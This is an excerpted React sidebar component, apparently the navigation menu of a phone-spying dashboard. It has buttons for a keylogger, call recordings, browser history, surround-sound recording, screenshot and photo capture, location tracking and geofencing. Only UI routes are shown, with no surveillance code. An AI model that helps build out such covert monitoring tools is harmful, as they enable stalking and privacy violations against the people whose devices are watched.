      ...
      <nav className="p-3 space-y-1 text-sm font-medium flex-1">
          ...
          {openSections.video && (
            <div className="ml-8 mt-1 space-y-1 pl-2 border-l border-slate-800 text-xs">
              {['YouTube', 'TikTok', 'ReelShort', 'OnlyFans'].map((app) => (
                <button
                  key={app}
                  onClick={() => navigate(`/${app.toLowerCase()}`)}
        ...
        <div>
          ...
          {openSections.phoneData && (
            <div className="ml-8 mt-1 space-y-1 pl-2 border-l border-slate-800 text-xs">
              ...
              <button onClick={() => navigate('/calls_recording')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
              ...
              <button onClick={() => navigate('/browser_history')} className="w-full flex items-center justify-between px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <div className="flex items-center space-x-2">
              ...
              <button onClick={() => navigate('/keylogger')} className="w-full flex items-center justify-between px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <div className="flex items-center space-x-2">
              ...
              <button onClick={() => navigate('/track_keywords')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <Search className="w-3.5 h-3.5 text-cyan-400" />
                <span>Track Keywords</span>
              </button>

              <button onClick={() => navigate('/wifi_logger')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <Wifi className="w-3.5 h-3.5 text-cyan-400" />
                <span>Wi-Fi Logger</span>
              </button>

              <button onClick={() => navigate('/app_management')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <Grid className="w-3.5 h-3.5 text-cyan-400" />
                <span>App Management</span>
              </button>

              <button onClick={() => navigate('/contacts')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <Users className="w-3.5 h-3.5 text-cyan-400" />
                <span>Contacts</span>
              </button>

              <button onClick={() => navigate('/calendar')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
        ...
        <div>
          ...
          {openSections.remoteControl && (
            <div className="ml-8 mt-1 space-y-1 pl-2 border-l border-slate-800 text-xs">
              <button onClick={() => navigate('/record_surround')} className="w-full flex items-center justify-between px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <div className="flex items-center space-x-2">
                  <Mic className="w-3.5 h-3.5 text-cyan-400" />
              ...
              <button onClick={() => navigate('/capture_screenshots')} className="w-full flex items-center justify-between px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <div className="flex items-center space-x-2">
              ...
              <button onClick={() => navigate('/take_photos')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
        ...
        <div>
          ...
          {openSections.location && (
            <div className="ml-8 mt-1 space-y-1 pl-2 border-l border-slate-800 text-xs">
              <button onClick={() => navigate('/locations')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
                <MapPin className="w-3.5 h-3.5 text-cyan-400" />
                <span>Locations</span>
              </button>

              <button onClick={() => navigate('/geofence')} className="w-full flex items-center space-x-2 px-2.5 py-1.5 rounded-lg hover:bg-slate-800/40 text-slate-300">
